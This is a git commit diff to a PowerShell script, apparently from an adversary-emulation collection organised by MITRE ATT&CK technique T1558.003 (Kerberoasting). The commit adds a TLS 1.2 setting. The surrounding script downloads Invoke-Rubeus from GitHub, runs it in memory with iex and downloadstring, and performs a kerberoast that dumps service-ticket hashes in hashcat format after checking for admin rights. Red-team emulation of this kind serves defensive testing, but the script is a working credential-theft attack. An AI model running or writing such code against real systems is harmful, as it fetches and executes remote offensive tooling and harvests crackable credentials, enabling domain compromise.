ea51070f9c8eacbbec4c14c02c6dd0853c6a4f65
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-27 15:31:07 +0800

    added admin priveleges to T1558.003

--- Credential Access/T1558.003.ps1
+++ Credential Access/T1558.003.ps1
@@ -5,5 +5,6 @@ if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]:
     exit;
 }
 
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
 Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
